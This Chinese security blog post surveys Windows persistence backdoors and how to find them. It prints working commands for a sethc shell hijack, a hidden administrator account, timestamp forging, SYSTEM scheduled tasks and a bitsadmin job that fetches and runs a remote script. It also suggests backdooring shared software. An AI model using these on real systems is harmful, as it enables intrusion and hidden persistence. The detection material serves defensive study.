@@ -1,0 +1,243 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Windows 关键文件安全性排查(红蓝对抗) - Resek&#039;s Kingdom</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Resek&#039;s Kingdom"><meta name="msapplication-TileImage" content="/img/favicon.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Resek&#039;s Kingdom"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="参考文章 windows 常见 backdoor、权限维持方法及排查技术  系统工具替换后门排查：autoruns 工具，下载地址： Autoruns for Windows v13.98此后门易被检测类似可被替换的程序有：  osk.exe Narrator.exe Magnify.exe"><meta property="og:type" content="blog"><meta property="og:title" content="Windows 关键文件安全性排查(红蓝对抗)"><meta property="og:url" content="https://resek4.github.io/2021/05/12/Windows%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8E%92%E6%9F%A5/"><meta property="og:site_name" content="Resek&#039;s Kingdom"><meta property="og:description" content="参考文章 windows 常见 backdoor、权限维持方法及排查技术  系统工具替换后门排查：autoruns 工具，下载地址： Autoruns for Windows v13.98此后门易被检测类似可被替换的程序有：  osk.exe Narrator.exe Magnify.exe"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/xyghvuyxg.png?token=AEZI7DIYWX52ARXCXKWEAITC6RAOK"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/xuzcyvguyg.png?token=AEZI7DNIIPIUY2BGPGTS5L3C6RAPG"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/xtfgyt.png?token=AEZI7DK3M3D7U4ZLZ2ST4OTC6RAQK"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/ycgvyg.png?token=AEZI7DJKOEIKIMMRJARTW4DC6RARW"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/xczviuhiu.png?token=AEZI7DO6XQN3PLQXOKWLL7DC6RAS6"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/pxklpk.png?token=AEZI7DIQMADNYC3PMKANSTTC6RAU6"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/xygyg.png?token=AEZI7DOSPP73ONERCQD3GR3C6RAWA"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/wmxh.png?token=AEZI7DJ6WO5BGEE7QUW6FIDC6RAXK"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/xcvhuuxh.png?token=AEZI7DJGZT67ARDFVABQZY3C6RAYG"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/xzcvzuyghvuays.png?token=AEZI7DOCPJD3GUUSZSKTNBDC6RAZI"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/zxcuvyguy.png?token=AEZI7DLZW7I2WICQNJGZ6IDC6RA2A"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/xcvgygygy.png?token=AEZI7DPONAJDFNDPIGFNWH3C6RA2W"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/xcvzguyg.png?token=AEZI7DNQHNW4HFCH47ZECR3C6RA3S"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/uyxghyg.png?token=AEZI7DMTX4VXVJ6YIRRZKJ3C6RA4S"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/xzuvyguyg.png?token=AEZI7DLJGKXCV4653LQHESTC6RA6C"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/xuguyg.png?token=AEZI7DOWRVLESZDXAIQZMX3C6RA62"><meta property="og:image" content="http://120.48.17.251:9000/privatebasement/img-backup/ixuhviuhiuh.png?token=AEZI7DNZKDD4TQPMRH7JIXTC6RBAK"><meta property="article:published_time" content="2021-05-11T16:00:00.000Z"><meta property="article:modified_time" content="2023-01-27T09:17:54.908Z"><meta property="article:author" content="Resek4"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="http://120.48.17.251:9000/privatebasement/img-backup/xyghvuyxg.png?token=AEZI7DIYWX52ARXCXKWEAITC6RAOK"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://resek4.github.io/2021/05/12/Windows%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8E%92%E6%9F%A5/"},"headline":"Windows 关键文件安全性排查(红蓝对抗)","image":[],"datePublished":"2021-05-11T16:00:00.000Z","dateModified":"2023-01-27T09:17:54.908Z","author":{"@type":"Person","name":"Resek4"},"publisher":{"@type":"Organization","name":"Resek's Kingdom","logo":{"@type":"ImageObject","url":"https://resek4.github.io/img/logo.jpg"}},"description":"参考文章 windows 常见 backdoor、权限维持方法及排查技术  系统工具替换后门排查：autoruns 工具，下载地址： Autoruns for Windows v13.98此后门易被检测类似可被替换的程序有：  osk.exe Narrator.exe Magnify.exe"}</script><link rel="canonical" href="https://resek4.github.io/2021/05/12/Windows%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8E%92%E6%9F%A5/"><link rel="icon" href="/img/favicon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/xt256.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oxanium:wght@300;400;600&amp;family=Roboto+Mono"><link rel="stylesheet" href="/css/cyberpunk.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 6.2.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.jpg" alt="Resek&#039;s Kingdom" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Resek4/resek4.github.io"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-05-11T16:00:00.000Z" title="5/12/2021, 12:00:00 AM">2021-05-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-01-27T09:17:54.908Z" title="1/27/2023, 5:17:54 PM">2023-01-27</time></span><span class="level-item"><a class="link-muted" href="/categories/Penetration/">Penetration</a></span><span class="level-item">19 minutes read (About 2878 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">Windows 关键文件安全性排查(红蓝对抗)</h1><div class="content"><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4842#toc-1">windows 常见 backdoor、权限维持方法及排查技术</a></li>
+</ul>
+<h1 id="系统工具替换后门"><a href="#系统工具替换后门" class="headerlink" title="系统工具替换后门"></a>系统工具替换后门</h1><p>排查：autoruns 工具，下载地址： <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/autoruns">Autoruns for Windows v13.98</a><br>此后门易被检测<br>类似可被替换的程序有：</p>
+<ul>
+<li>osk.exe</li>
+<li>Narrator.exe</li>
+<li>Magnify.exe</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="utilman-辅助工具管理器"><a href="#utilman-辅助工具管理器" class="headerlink" title="[[utilman]]辅助工具管理器"></a>[[utilman]]辅助工具管理器</h2><p>![[utilman]]</p>
+<h2 id="sethc-exe-轻松使用"><a href="#sethc-exe-轻松使用" class="headerlink" title="sethc.exe 轻松使用"></a>sethc.exe 轻松使用</h2><p>经典的 shift 后门</p>
+<blockquote>
+<p>修改注册表 <code>HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code> 下 <code>sethc.exe</code>，添加一个 <code>Debugger</code> 字符值（REG_SZ），并且赋值为 cmd.exe 的执行路径为 <code>C: \\windows\\system32\\cmd.exe</code></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</span><br></pre></td></tr></table></figure>
+
+<p>这里有更高阶的使用方法，且不会被 autoruns 检测到： <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247483994&idx=1&sn=4041632680d059c6d9ed0aba0701ca71&chksm=cf4d8d3bf83a042d23216c02418ccbd377103f65b1b0eed0cbad61b055966bccd24c7637e495&mpshare=1&scene=23&srcid=&sharer_sharetime=1571196868049&sharer_shareid=be7a01e2434a36782542fb17e9d2a6e8#rd">打造不一样的 Shfit 映像劫持后门</a></p>
+<h1 id="后门账号"><a href="#后门账号" class="headerlink" title="后门账号"></a>后门账号</h1><ul>
+<li>创建克隆 administrator 账号，且通过命令 net user 以及控制面板中的管理账户无法看到。</li>
+</ul>
+<p>![[powershell#用户]]<br>1.创建后门用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user defaultuser0$ somepasswordhere /add /y</span><br><span class="line">net localgroup administrators defaultuser0$ /add</span><br><span class="line">net localgroup &quot;remote desktop users&quot; defaultuser0$ /add</span><br></pre></td></tr></table></figure>
+
+<p>2.之后将 administrator 用户对应的 Users 中的 F 值复制替换后门账户的 F 值<br><img src="http://120.48.17.251:9000/privatebasement/img-backup/xyghvuyxg.png?token=AEZI7DIYWX52ARXCXKWEAITC6RAOK"><br>3.导出 User 下面的后门账户以及 name 下面的后门账户两个文件。<br><img src="http://120.48.17.251:9000/privatebasement/img-backup/xuzcyvguyg.png?token=AEZI7DNIIPIUY2BGPGTS5L3C6RAPG"><br>4.通过命令删除刚才的后门用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user defaultuser0$ /del</span><br></pre></td></tr></table></figure>
+
+<p>5.通过注册表导入刚才保存的两个注册表<br><img src="http://120.48.17.251:9000/privatebasement/img-backup/xtfgyt.png?token=AEZI7DK3M3D7U4ZLZ2ST4OTC6RAQK"><br><img src="http://120.48.17.251:9000/privatebasement/img-backup/ycgvyg.png?token=AEZI7DJKOEIKIMMRJARTW4DC6RARW"></p>
+<ul>
+<li>参考文章 <a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/">Windows 系统的帐户隐藏</a></li>
+</ul>
+<h1 id="明文账号记录"><a href="#明文账号记录" class="headerlink" title="明文账号记录"></a>明文账号记录</h1><ul>
+<li>安全支持提供程序（SSP）是 Windows API，用于扩展 Windows 身份验证机制。 LSASS 进程在 Windows 启动期间加载安全支持提供程序 DLL。这个时候攻击者可以将精心构造的 dll 加载之，这个 dll 可获取到 lsass 进程中的明文账号密码信息。mimikatz(mimilib.dll 或 memssp 内存补丁方式)实现了这一功能，并把记录到的明文账号密码信息保存在本地。</li>
+<li>详见文章 <a target="_blank" rel="noopener" href="https://pentestlab.blog/2019/10/21/persistence-security-support-provider/">Persistence – Security Support Provider</a></li>
+</ul>
+<h1 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h1><h2 id="attrib-命令隐藏"><a href="#attrib-命令隐藏" class="headerlink" title="attrib 命令隐藏"></a>attrib 命令隐藏</h2><ul>
+<li>windows 自带命令行工具 attrib 用来显示或更改文件属性。</li>
+</ul>
+<p><img src="http://120.48.17.251:9000/privatebasement/img-backup/xczviuhiu.png?token=AEZI7DO6XQN3PLQXOKWLL7DC6RAS6"></p>
+<ul>
+<li>优点:简单</li>
+<li>缺点:暂无</li>
+<li>排查:使用 attrib 命令或者 D 盾</li>
+</ul>
+<h2 id="使用-ADS-流隐藏-webshell"><a href="#使用-ADS-流隐藏-webshell" class="headerlink" title="使用 ADS 流隐藏 webshell"></a>使用 ADS 流隐藏 webshell</h2><blockquote>
+<p>ADS 即 NTFS 文件流</p>
+</blockquote>
+<ul>
+<li>使用 ADS 流隐藏 webshell,目前可过 D 盾扫描,注意 ADS 的一句话木马无法直接连接，可以使用 php 的 include 去包含执行</li>
+</ul>
+<p><img src="http://120.48.17.251:9000/privatebasement/img-backup/pxklpk.png?token=AEZI7DIQMADNYC3PMKANSTTC6RAU6"><br><img src="http://120.48.17.251:9000/privatebasement/img-backup/xygyg.png?token=AEZI7DOSPP73ONERCQD3GR3C6RAWA"></p>
+<ul>
+<li>文章参考： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozi/p/7610984.html">利用 ADS 隐藏 webshell</a><br>  文章参考： <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/terminal/195721.html">Windows ADS 在渗透测试中的妙用</a></li>
+<li>此外应该注意修改文件的 timestamp，可使用如下的[[powershell]]命令或者使用 NewFileTime 工具</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$(Get-Item ).creationtime=$(Get-Date <span class="string">&quot;mm/dd/yyyy hh:mm am/pm&quot;</span>)</span><br><span class="line">$(Get-Item ).lastaccesstime=$(Get-Date <span class="string">&quot;mm/dd/yyyy hh:mm am/pm&quot;</span>)</span><br><span class="line">$(Get-Item ).lastwritetime=$(Get-Date <span class="string">&quot;mm/dd/yyyy hh:mm am/pm&quot;</span>)</span><br><span class="line">example：</span><br><span class="line">Set the last-access time <span class="keyword">for</span> a file aaa.csv to the current time:  $(Get-Item aaa.csv).lastwritetime=$(Get-Date)</span><br><span class="line">Set the creation time of a file foo.txt to November <span class="number">24</span>, <span class="number">2015</span>, at <span class="number">6</span>:<span class="number">00</span>am: $(Get-Item foo.txt).creationtime=$(Get-Date <span class="string">&quot;11/24/2015 06:00 am&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>优点：较难检测</li>
+<li>缺点：暂无</li>
+<li>排查： dir &#x2F;r</li>
+</ul>
+<h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><ul>
+<li>schtasks 和 at 命令，例如下面的命令</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#from https://github.com/diggles9991/MG/blob/master/XMR/Hook.ps1#L12</span><br><span class="line"># Update scheduled Start Task</span><br><span class="line">SCHTASKS /Delete /tn &quot;AdobeReaderUpdate&quot; /f</span><br><span class="line">SCHTASKS /Create /RU &quot;SYSTEM&quot; /tn &quot;AdobeReaderUpdate&quot; /sc Weekly /d * /st 18:00:00 /tr &quot;powershell.exe C:\Windows\System32\drivers\en-US\etc\Line.ps1&quot;</span><br><span class="line"></span><br><span class="line"># Update scheduled End Task</span><br><span class="line"># SCHTASKS /Delete /tn &quot;AdobeReaderUpdateEnd&quot; /f</span><br><span class="line">SCHTASKS /Create /RU &quot;SYSTEM&quot; /tn &quot;AdobeReaderUpdateEnd&quot; /sc Weekly /d MON,TUE,WED,THU,FRI /st 06:00:00 /tr &quot;powershell.exe Stop-Process -Name $processname&quot;</span><br><span class="line"></span><br><span class="line"># At command</span><br><span class="line">at 1:00AM /Every:Saturday My_BackUp.bat </span><br><span class="line">在每个Saturday的早上1:00点，定时启动My_BackUp.bat批处理文件。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>优点：简单</li>
+<li>缺点：易被检测</li>
+<li>排查： schtasks &#x2F;query 命令进行查询或者通过计算机的管理查看，注意在 windows 的中文版系统中，schtasks 命令需要切换字符为美国英语格式，使用命令 chcp 437，或者直接工具 autoruns。</li>
+</ul>
+<h1 id="开机启动项"><a href="#开机启动项" class="headerlink" title="开机启动项"></a>开机启动项</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br><span class="line">等</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>优点：重启权限维持</li>
+<li>缺点：一般杀软均会拦截</li>
+<li>排查：一个一个手工查太麻烦，建议直接上 autoruns。</li>
+<li>20191022 更新</li>
+<li>利用 windows 原生 API 去创建 regedit.exe 不能展示和导出的键值对</li>
+<li>详见文章 <a target="_blank" rel="noopener" href="https://github.com/ewhitehats/InvisiblePersistence/blob/master/InvisibleRegValues_Whitepaper.pdf">invisible Reg Values</a> ,缺点只是通过regedit.exe查看时候有隐藏效果，通过autoruns等工具还是会被发现。</li>
+</ul>
+<h1 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create [ServerName] binPath= BinaryPathName</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>优点：重启权限维持</li>
+<li>缺点：一般杀软会拦截</li>
+<li>排查：工具 autoruns</li>
+</ul>
+<h1 id="waitfor-exe"><a href="#waitfor-exe" class="headerlink" title="waitfor.exe"></a>waitfor.exe</h1><ul>
+<li>不支持自启动，但可远程主动激活，后台进程显示为 waitfor.exe</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Waitfor-Persistence">详细参考</a></p>
+<ul>
+<li>优点：远程主动激活</li>
+<li>缺点：有 waitfor 进程</li>
+<li>排查：通过 Process Explorer 工具查看是否有 waitfor.exe 进程，并进一步查看启动参数等。</li>
+</ul>
+<h1 id="bitsadmin-后门"><a href="#bitsadmin-后门" class="headerlink" title="bitsadmin 后门"></a>bitsadmin 后门</h1><ul>
+<li>Bitsadmin 从 win7 之后操作系统就默认包含，可以用来创建上传或者下载任务。Bistadmin 可以指定下载成功之后要进行什么命令。后门就是利用的下载成功之后进行命令执行。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#创建一个下载任务：</span><br><span class="line">bitsadmin /create backdoor</span><br><span class="line">#添加文档：</span><br><span class="line">bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe</span><br><span class="line">#设置下载成功之后要执行的命令：</span><br><span class="line">bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll&quot;</span><br><span class="line">#执行任务：</span><br><span class="line">bitsadmin /Resume backdoor</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>可以参考这篇文章</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://paper.tuisec.win/detail/77720db7618e92c">bitsadmin-backdoor-权限维持后门</a></p>
+<ul>
+<li>优点：系统自带无需上传</li>
+<li>缺点：免杀效果一般</li>
+<li>排查：bitsadmin &#x2F;list &#x2F;verbose</li>
+</ul>
+<h1 id="WMI-后门-重点"><a href="#WMI-后门-重点" class="headerlink" title="WMI 后门(重点!)"></a><strong>WMI 后门(重点!)</strong></h1><ul>
+<li>在 2015 年的 blackhat 大会上 Matt Graeber 介绍了一种无文件后门就是用的 wmi。 <a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf">更多可以参考</a></li>
+<li>在 empire 中有相应的 module，作者参考使用了 <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/9e771d15bf19ab3c2ac196393c088ecdab6c9a73/Persistence/Persistence.psm1">Powersploit</a> 里面的代码。</li>
+</ul>
+<p><img src="http://120.48.17.251:9000/privatebasement/img-backup/wmxh.png?token=AEZI7DJ6WO5BGEE7QUW6FIDC6RAXK"><br><img src="http://120.48.17.251:9000/privatebasement/img-backup/xcvhuuxh.png?token=AEZI7DJGZT67ARDFVABQZY3C6RAYG"></p>
+<ul>
+<li>后门在系统重启五分钟之内触发且是 system 权限。</li>
+<li>优点：无文件，相对来说难以排查</li>
+<li>缺点：暂无</li>
+<li>排查：工具 autoruns</li>
+</ul>
+<h1 id="COM-劫持"><a href="#COM-劫持" class="headerlink" title="COM 劫持"></a>COM 劫持</h1><ul>
+<li>可以参考文章 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/115241.html">打开文件夹就运行？COM 劫持利用新姿势</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.4hou.com/technology/6863.html">利用 CLR 实现一种无需管理员权限的后门</a> “主动型”后门，WMI添加环境变量需要重启系统生效</li>
+<li>优点:隐藏性较好,autoruns 查不到</li>
+<li>缺点:暂无</li>
+<li>排查:检查环境变量和注册表键值<br>  <a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20190417211806-3cfc2272-6113-1.png"></a></li>
+</ul>
+<p><img src="http://120.48.17.251:9000/privatebasement/img-backup/xzcvzuyghvuays.png?token=AEZI7DOCPJD3GUUSZSKTNBDC6RAZI"></p>
+<h1 id="meterpreter-权限维持"><a href="#meterpreter-权限维持" class="headerlink" title="meterpreter 权限维持"></a>meterpreter 权限维持</h1><ul>
+<li>meterpreter 中的权限维持技术有两种，一种是 metsvc 的后门(服务后门)，另外一种是 persistence(注册表后门)</li>
+<li>metsvc 是开机自启动的服务型后门</li>
+</ul>
+<p><img src="http://120.48.17.251:9000/privatebasement/img-backup/zxcuvyguy.png?token=AEZI7DLZW7I2WICQNJGZ6IDC6RA2A"></p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/76954957c740525cff2db5a60bcf936b4ee06c42/scripts/meterpreter/metsvc.rb">metsvc 代码</a></p>
+</li>
+<li><p>persistence 模块是先上传 vbs 脚本并执行 vbs 脚本修改注册表 HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 从而完成自启动。<br>  <img src="http://120.48.17.251:9000/privatebasement/img-backup/xcvgygygy.png?token=AEZI7DPONAJDFNDPIGFNWH3C6RA2W"><br>  <img src="http://120.48.17.251:9000/privatebasement/img-backup/xcvzguyg.png?token=AEZI7DNQHNW4HFCH47ZECR3C6RA3S"></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/persistence_exe.rb">persistence 代码</a></p>
+</li>
+<li><p>优点：开机自启动</p>
+</li>
+<li><p>缺点：容易被杀软杀</p>
+</li>
+<li><p>排查：像是这种后门使用 autoruns 基本都可以排查出来。</p>
+</li>
+</ul>
+<h1 id="Empire-persistence-模块-重点"><a href="#Empire-persistence-模块-重点" class="headerlink" title="Empire persistence 模块(重点!!)"></a><strong>Empire persistence 模块(重点!!)</strong></h1><ul>
+<li>Empire 是一款功能非常强大的后渗透攻击框架。其中的 persistence 模块提供了一系列权限维持方法。</li>
+<li>工具还把权限维持分为了四大类，userland(普通权限)、elevated(需要高权限)、powerbreach(内存权限维持，重启后失效)、miscellaneous(其它)。</li>
+</ul>
+<p><img src="http://120.48.17.251:9000/privatebasement/img-backup/uyxghyg.png?token=AEZI7DMTX4VXVJ6YIRRZKJ3C6RA4S"></p>
+<ul>
+<li>通过 info 命令查看使用方法</li>
+</ul>
+<p><img src="http://120.48.17.251:9000/privatebasement/img-backup/xzuvyguyg.png?token=AEZI7DLJGKXCV4653LQHESTC6RA6C"></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/">更多可以参考文章</a></li>
+<li>优点:基本集成了大部分的权限维持方法</li>
+<li>缺点：暂无</li>
+<li>排查：工具 autoruns</li>
+</ul>
+<h1 id="进程注入-重点"><a href="#进程注入-重点" class="headerlink" title="进程注入(重点!!)"></a><strong>进程注入(重点!!)</strong></h1><ul>
+<li>准确来说进程注入不是后门技术或者权限维持技术，而是一种隐藏技术，这里简单说一下 empire 的 psinject、cobaltstrike 的 inject 和 meterpreter 中的 migrate 进程注入，一般可以注入到像是 lsass 或者 explorer 这样的进程当中，相对比较隐蔽，较难排查。</li>
+<li>使用方法这里就不介绍了，主要说一下如何 hunting。这篇文章 <a target="_blank" rel="noopener" href="https://holdmybeersecurity.com/2019/02/27/sysinternals-for-windows-incident-response/">TALES OF A BLUE TEAMER: DETECTING POWERSHELL EMPIRE SHENANIGANS WITH SYSINTERNALS</a> 里面介绍了如何hunting empire方法，empire有一些evasion detection机制，其中的网络连接时间设置能有效避开常见主机流量检测工具(包括netstat、tcpview)的检测，文章中也介绍了使用process monitor是最快也是最有效的方法。</li>
+</ul>
+<p><img src="http://120.48.17.251:9000/privatebasement/img-backup/xuguyg.png?token=AEZI7DOWRVLESZDXAIQZMX3C6RA62"></p>
+<ul>
+<li>但是在 hunting 进程注入的时候，并没有像文章中说的查找到以起始地址为 0x0 的线程，但会发现被注入的进程属性里会有.NET Assemblies 和.NET Performance 两个菜单。如下图所示</li>
+</ul>
+<p><img src="http://120.48.17.251:9000/privatebasement/img-backup/ixuhviuhiuh.png?token=AEZI7DNZKDD4TQPMRH7JIXTC6RBAK"></p>
+<ul>
+<li>优点：较难排查</li>
+<li>缺点：暂无</li>
+<li>排查：工具 process explorer 、process monitor</li>
+</ul>
+<h1 id="BDF-后门"><a href="#BDF-后门" class="headerlink" title="BDF 后门"></a>BDF 后门</h1><ul>
+<li>BDF(The Backdoor Factory)可用来向可执行文件植入后门，修改程序执行流程，执行添加的 payload。</li>
+<li>参考 <a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91EXE%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/">利用 BDF 向 EXE 文件植入后门</a></li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://2001586161veronika.blog.binusian.org/2018/05/30/backdoor-factory/">Kali Linux: Backdoor-factory tool</a></p>
+<ul>
+<li>当拿到内网权限之后，可以在存放公共下载的服务器上给某个软件加上这样的后门。</li>
+</ul>
+<h1 id="IIS-模块后门"><a href="#IIS-模块后门" class="headerlink" title="IIS 模块后门"></a>IIS 模块后门</h1><p><a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/415">手把手带你开发一款 IIS 模块后门</a></p>
+<h1 id="域-环境后门"><a href="#域-环境后门" class="headerlink" title="[[域]]环境后门"></a>[[域]]环境后门</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/189942.html?utm_source=tuicool&utm_medium=referral">域内配置 ACL 后门及检测清理</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/kevien/PasswordchangeNotify">PasswordchangeNotify</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/member/127729">域后门相关文章</a></li>
+</ul>
+<h1 id="other"><a href="#other" class="headerlink" title="other"></a>other</h1><ul>
+<li>除了以上的几种后门和权限维持技术外还有像是 dll 劫持、一些软件的插件后门、office 后门等。</li>
+</ul>
